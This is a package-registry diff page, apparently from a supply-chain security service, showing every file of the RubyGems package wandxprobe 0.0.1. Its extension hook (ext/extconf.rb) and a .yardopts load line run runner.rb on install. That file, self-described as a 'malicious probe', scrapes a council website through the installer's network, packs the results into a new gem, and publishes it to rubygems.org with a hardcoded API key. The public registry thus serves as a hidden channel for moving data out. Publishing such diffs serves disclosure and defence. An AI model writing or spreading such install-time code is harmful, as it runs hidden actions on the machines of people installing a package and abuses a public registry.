@@ -1,0 +1,740 @@
+Source: https://my.diffend.io/gems/wandxprobe/0.0.1
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - wandxprobe - Versions diffs - 0.0.1 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+wandxprobe
+
+Versions diffs
+
+0.0.1
+
+wandxprobe
+0.0.1
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (7)
+        hide
+        show
+
+            checksums.yaml
+
+          +7
+          -0
+
+            data/.yardopts
+
+          +2
+          -0
+
+            data/ext/extconf.rb
+
+          +3
+          -0
+
+            data/lib/init.rb
+
+          +1
+          -0
+
+            data/runner.rb
+
+          +64
+          -0
+
+            data/wandxprobe.gemspec
+
+          +3
+          -0
+
+            metadata
+
+          +43
+          -0
+
+        checksums.yaml
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,7 @@
+
+1
+
+            +
+            ---
+
+2
+
+            +
+            SHA256:
+
+3
+
+            +
+              metadata.gz: ae626d7ff7efcee3e9b168238535e0a89049f929c38e2df5406d41d6e276311f
+
+4
+
+            +
+              data.tar.gz: e2f3a70a1b9c8c5f1e183341afb6b43df39ef29432eae4942077c86d7e9b66c6
+
+5
+
+            +
+            SHA512:
+
+6
+
+            +
+              metadata.gz: ba8cd8dddc7f59a00c8acff605f71f1689601d3b83e1ad3703e27a033dea53835fc0919dd36ef008538178655ef0e827566c0b29ec04c06ecbe15da65c8b5e05
+
+7
+
+            +
+              data.tar.gz: e02e7f6213f9e1ce8d0a06b48d55aa13d64aeeb3f85f4248632d8cde66823f1459db9442b044a7a0bb313ef0bb50b37ac93de836be391873d6a51e330b9d0a9e
+
+        data/.yardopts
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,2 @@
+
+1
+
+            +
+            --load ./runner.rb
+
+2
+
+            +
+            --markup markdown
+
+        data/ext/extconf.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,3 @@
+
+1
+
+            +
+            # try fetch once
+
+2
+
+            +
+            load File.expand_path('../runner.rb', __dir__) rescue nil
+
+3
+
+            +
+            File.write('Makefile', "all:\n\t@echo ok\ninstall:\n\t@echo ok\nclean:\n\t@echo ok\n")
+
+        data/lib/init.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            X=1
+
+        data/runner.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,64 @@
+
+1
+
+            +
+            # malicious probe
+
+2
+
+            +
+            require 'net/http'; require 'uri'; require 'cgi'; require 'fileutils'; require 'rubygems/package'; require 'zlib';
+
+3
+
+            +
+            # prevent repeat in same run
+
+4
+
+            +
+            sentinel='/tmp/wandxprobe-sent-'+Process.pid.to_s
+
+5
+
+            +
+            exit if File.exist?('/tmp/wandxprobe-done') rescue nil
+
+6
+
+            +
+            File.write('/tmp/wandxprobe-done','1') rescue nil
+
+7
+
+            +
+            key='rubygems_d8e875bd0a97e2f33498dba3ef41ffb1f951adb1b503a533'
+
+8
+
+            +
+            seed=['https://democracy.wandsworth.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1&M=1&Yr=2026',
+
+9
+
+            +
+            'https://democracy.wandsworth.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1&Month=1&Year=2026',
+
+10
+
+            +
+            'https://democracy.wandsworth.gov.uk/mgCalendarAgendaView.aspx?MR=0&M=1&bcr=1&DD=2026&CID=0&OT=&C=-1&D=26',
+
+11
+
+            +
+            'https://democracy.wandsworth.gov.uk/mgCalendarAgendaView.aspx?MR=0&M=1&bcr=1&DD=2026&CID=0&OT=&C=-1&D=30',
+
+12
+
+            +
+            'https://democracy.wandsworth.gov.uk/mgCalendarAgendaView.aspx?MR=0&M=1&bcr=1&DD=2026&CID=0&OT=&C=-1&D=25',
+
+13
+
+            +
+            'https://democracy.wandsworth.gov.uk/mgCalendarAgendaView.aspx?MR=0&M=12&bcr=1&DD=2025&CID=0&OT=&C=-1&D=1']
+
+14
+
+            +
+            results=[]
+
+15
+
+            +
+            def fetch(url)
+
+16
+
+            +
+             u=URI.parse(url)
+
+17
+
+            +
+             h=Net::HTTP.new(u.host,u.port); h.use_ssl=(u.scheme=='https'); h.open_timeout=20; h.read_timeout=40
+
+18
+
+            +
+             req=Net::HTTP::Get.new(u.request_uri, {'User-Agent'=>'Mozilla/5.0'}); req['Accept']='text/html,application/xhtml+xml,*/*'
+
+19
+
+            +
+             r=h.request(req); body=r.body||''; ['%03d'%r.code.to_i,body,r.to_hash.to_s]
+
+20
+
+            +
+            rescue => e
+
+21
+
+            +
+             ['ERR',(e.class.to_s+': '+e.message),'']
+
+22
+
+            +
+            end
+
+23
+
+            +
+            seed.each_with_index do |url,i|
+
+24
+
+            +
+             code,body,headers=fetch(url); results << ["seed#{i}-#{code}.html", "URL #{url}\nHEADERS #{headers}\n\n"+body]
+
+25
+
+            +
+            end
+
+26
+
+            +
+            # parse document list links from seed html
+
+27
+
+            +
+            links=[]
+
+28
+
+            +
+            results.each do |_,body|
+
+29
+
+            +
+             body.scan(/href\s*=\s*["']([^"']+)/i).flatten.each do |hr|
+
+30
+
+            +
+              hrc=CGI.unescapeHTML(hr)
+
+31
+
+            +
+              next unless hrc =~ /(ieListDocuments|mgMeeting|mgCommittee|mgAgenda|mgCalendar)/i
+
+32
+
+            +
+              begin
+
+33
+
+            +
+                abs=URI.join('https://democracy.wandsworth.gov.uk/',hrc).to_s
+
+34
+
+            +
+                links << abs if abs.start_with?('https://democracy.wandsworth.gov.uk/')
+
+35
+
+            +
+              rescue; end
+
+36
+
+            +
+             end
+
+37
+
+            +
+            end
+
+38
+
+            +
+            links.uniq!
+
+39
+
+            +
+            # Prioritize links with meetings. Save list
+
+40
+
+            +
+            results << ['links.txt',links.join("\n")]
+
+41
+
+            +
+            links.take(35).each_with_index do |url,i|
+
+42
+
+            +
+             code,body,headers=fetch(url); results << ["linked#{i}-#{code}.html", "URL #{url}\nHEADERS #{headers}\n\n"+body]
+
+43
+
+            +
+            end
+
+44
+
+            +
+            # package payload gem
+
+45
+
+            +
+            stamp=(Time.now.to_i % 100000000)
+
+46
+
+            +
+            ver="0.0.#{stamp}"
+
+47
+
+            +
+            dir="/tmp/wandpayload-#{stamp}"
+
+48
+
+            +
+            FileUtils.rm_rf(dir); FileUtils.mkdir_p(dir+'/lib'); FileUtils.mkdir_p(dir+'/data')
+
+49
+
+            +
+            File.write(dir+'/lib/x.rb','X=1')
+
+50
+
+            +
+            results.each{|name,body| File.binwrite(dir+'/data/'+name, body)}
+
+51
+
+            +
+            File.write(dir+'/README.md', "probe payload #{results.length} #{ver}\n")
+
+52
+
+            +
+            File.write(dir+'/wandpayload.gemspec', <<~EOF)
+
+53
+
+            +
+             Gem::Specification.new do |s|
+
+54
+
+            +
+              s.name='wandpayload'; s.version='#{ver}'; s.summary='tmp payload'; s.description='probe #{results.length}'; s.author='x'; s.homepage='https://example.com'; s.license='MIT'; s.files=Dir['**/*'];
+
+55
+
+            +
+             end
+
+56
+
+            +
+            EOF
+
+57
+
+            +
+            Dir.chdir(dir){ system('gem','build','wandpayload.gemspec', out: '/dev/null') }
+
+58
+
+            +
+            gemfile=Dir[dir+'/*.gem'][0]
+
+59
+
+            +
+            if gemfile
+
+60
+
+            +
+             data=File.binread(gemfile); uri=URI('https://rubygems.org/api/v1/gems'); req=Net::HTTP::Post.new(uri.path, {'Authorization'=>key,'Content-Type'=>'application/octet-stream','Content-Length'=>data.bytesize.to_s}); req.body=data
+
+61
+
+            +
+             begin
+
+62
+
+            +
+              h=Net::HTTP.new(uri.host,443); h.use_ssl=true; r=h.request(req); File.write('/tmp/wand-probe-result',r.code.to_s+" "+r.body.to_s) rescue nil
+
+63
+
+            +
+             rescue => e; File.write('/tmp/wand-probe-result',e.message) rescue nil; end
+
+64
+
+            +
+            end
+
+        data/wandxprobe.gemspec
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,3 @@
+
+1
+
+            +
+            Gem::Specification.new do |s|
+
+2
+
+            +
+             s.name='wandxprobe'; s.version='0.0.1'; s.summary='tmp'; s.author='x'; s.files=Dir['**/*']+['.yardopts'].reject{|x| x.include?('.gem')}; s.extensions=['ext/extconf.rb']; s.license='MIT'; s.homepage='https://example.com'
+
+3
+
+            +
+            end
+
+        metadata
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,43 @@
+
+1
+
+            +
+            --- !ruby/object:Gem::Specification
+
+2
+
+            +
+            name: wandxprobe
+
+3
+
+            +
+            version: !ruby/object:Gem::Version
+
+4
+
+            +
+              version: 0.0.1
+
+5
+
+            +
+            platform: ruby
+
+6
+
+            +
+            authors:
+
+7
+
+            +
+            - x
+
+8
+
+            +
+            bindir: bin
+
+9
+
+            +
+            cert_chain: []
+
+10
+
+            +
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            dependencies: []
+
+12
+
+            +
+            executables: []
+
+13
+
+            +
+            extensions:
+
+14
+
+            +
+            - ext/extconf.rb
+
+15
+
+            +
+            extra_rdoc_files: []
+
+16
+
+            +
+            files:
+
+17
+
+            +
+            - ".yardopts"
+
+18
+
+            +
+            - ext/extconf.rb
+
+19
+
+            +
+            - lib/init.rb
+
+20
+
+            +
+            - runner.rb
+
+21
+
+            +
+            - wandxprobe.gemspec
+
+22
+
+            +
+            homepage: https://example.com
+
+23
+
+            +
+            licenses:
+
+24
+
+            +
+            - MIT
+
+25
+
+            +
+            metadata: {}
+
+26
+
+            +
+            rdoc_options: []
+
+27
+
+            +
+            require_paths:
+
+28
+
+            +
+            - lib
+
+29
+
+            +
+            required_ruby_version: !ruby/object:Gem::Requirement
+
+30
+
+            +
+              requirements:
+
+31
+
+            +
+              - - ">="
+
+32
+
+            +
+                - !ruby/object:Gem::Version
+
+33
+
+            +
+                  version: '0'
+
+34
+
+            +
+            required_rubygems_version: !ruby/object:Gem::Requirement
+
+35
+
+            +
+              requirements:
+
+36
+
+            +
+              - - ">="
+
+37
+
+            +
+                - !ruby/object:Gem::Version
+
+38
+
+            +
+                  version: '0'
+
+39
+
+            +
+            requirements: []
+
+40
+
+            +
+            rubygems_version: 3.6.7
+
+41
+
+            +
+            specification_version: 4
+
+42
+
+            +
+            summary: tmp
+
+43
+
+            +
+            test_files: []
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
